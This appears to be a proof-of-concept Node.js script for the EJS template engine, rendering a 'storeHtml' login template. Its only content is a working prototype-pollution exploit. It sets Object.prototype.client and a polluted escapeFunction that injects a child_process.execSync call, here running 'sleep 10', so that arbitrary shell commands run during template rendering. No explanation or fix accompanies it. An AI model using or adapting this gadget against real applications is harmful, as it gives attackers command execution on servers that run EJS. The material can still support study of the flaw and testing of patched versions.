const ejs = require('ejs')
const path = require('path');
const templatePath = path.join(__dirname, 'views', 'login_register.ejs');

Object.prototype.client = true
Object.prototype.escapeFunction = "false;\nprocess.mainModule.require('child_process').execSync(\`sleep 10\`)\n"

var result = ejs.renderFile(templatePath, {
    title:" storeHtml | logins ",
    buttonHintF:"login",
    buttonHintS:"No account? Register now",
    hint:"login",
    next:"/register"
})

